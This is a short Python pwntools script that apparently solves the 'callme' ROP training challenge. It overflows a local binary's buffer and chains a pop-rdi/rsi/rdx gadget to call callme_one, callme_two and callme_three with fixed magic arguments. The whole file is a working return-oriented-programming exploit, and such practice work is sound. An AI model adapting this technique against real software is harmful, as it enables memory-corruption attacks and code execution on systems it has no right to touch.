#!/bin/python3
from pwn import *

p = process('./callme')
e = ELF('./callme')
r = ROP('./callme')

offset = 0x7ffca4bda698 - 0x7ffca4bda670

params = b''
params += p64(r.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret']).address)
params += p64(0xdeadbeefdeadbeef) # put it twice bc assembly showed it was comparing twice
params += p64(0xcafebabecafebabe)
params += p64(0xd00df00dd00df00d)

payload = b'A'*offset
payload += params
payload += p64(e.plt['callme_one'])
payload += params
payload += p64(e.plt['callme_two'])
payload += params
payload += p64(e.plt['callme_three'])


p.sendline(payload)

p.interactive()
